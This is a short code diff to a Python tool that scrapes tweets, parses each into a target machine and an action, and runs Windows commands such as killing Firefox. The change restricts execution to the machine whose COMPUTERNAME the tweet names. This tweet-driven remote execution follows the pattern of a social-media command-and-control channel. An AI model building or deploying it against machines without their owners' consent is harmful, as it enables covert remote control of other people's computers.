@@ -15,6 +15,7 @@ class WindowsCmds():
     def __init__(self):
         import os
         import subprocess
+        self.name = os.environ['COMPUTERNAME']
 
     def killFirefox(self):
         '''
@@ -134,12 +135,13 @@ class TweetScrape():
                 The results of this function will be passed into windows_cmdExecution to complete a command.
         '''
 
+        name = os.environ['COMPUTERNAME']
         machine = dottedTweet.split(".")[1]
         action = dottedTweet.split(".")[2]
-        print("Action: " + str(action) + " applied to machine " + str(machine))
+        print("Action: " + str(action) + " applied to machine " + str(machine)) #Debugging
 
-        windows_cmdExcution(action, machine)
-
+        if machine == name: #If the tweet is directed at the machine, execute. 
+            windows_cmdExcution(action, machine) 
 
 if __name__ == "__main__":
 
